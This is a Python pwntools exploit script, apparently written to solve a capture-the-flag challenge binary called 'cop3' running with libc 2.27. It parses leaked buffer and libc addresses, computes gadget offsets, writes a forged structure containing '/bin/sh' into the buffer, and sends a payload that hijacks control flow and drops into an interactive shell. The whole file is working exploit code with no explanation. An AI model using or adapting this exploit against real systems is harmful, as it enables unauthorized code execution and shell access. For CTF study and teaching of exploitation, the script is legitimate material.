from pwn import *
#remote_addr=['',0] # 23333 for ubuntu16, 23334 for 18, 23335 for 19 context.log_level=True
#p=remote(remote_addr[0],remote_addr[1])
elf_path = "./cop3" 
p = process(elf_path,env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF("./libc-2.27.so") 
elf = ELF(elf_path)
#gdb.attach(p, 'c')
ru = lambda x : p.recvuntil(x) 
sn = lambda x : p.send(x) 
rl = lambda : p.recvline() 
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x) 
sa = lambda a,b : p.sendafter(a,b) 
sla = lambda a,b : p.sendlineafter(a,b)
def lg(s,addr = None): 
    if addr: 
        print('\033[1;31;40m[+] %-15s --> 0x%8x\033[0m'%(s,addr)) 
    else: 
        print('\033[1;32;40m[-] %-20s \033[0m'%(s))
def raddr(a=6): 
    if(a==6): 
        return u64(rv(a).ljust(8,'\x00')) 
    else: 
        return u64(rl().strip('\n').ljust(8,'\x00'))
def write_64(buf, idx, value): 
    buf = buf[0:idx] + p64(value) + buf[idx+8: ] 
    return buf
if __name__ == '__main__': 
    leak = p.clean().split(", ") 
    buffer_addr = int(leak[0], 16) 
    libc.address = int(leak[1], 16) - libc.symbols['_IO_2_1_stdin_'] 
    gadget = libc.address + 0x153931 
    payload = str(buffer_addr).ljust(0x18) + p64(gadget) 
    payload1 = '/bin/sh\x00' 
    payload1 = payload1.ljust(0xff, '\x00') 
    payload1 = write_64(payload1, 0xd0, buffer_addr + 0x80) 
    payload1 = write_64(payload1, 0x80+0x20, libc.address + 0x5b8d6) 
    payload1 = write_64(payload1, 0x80+0x38, libc.address + 0x4eeb0 + 2) 
    sn(payload1) 
    sleep(1) 
    lg("gadget", gadget) #gdb.attach(p) 
    sn(payload) 
    p.interactive()
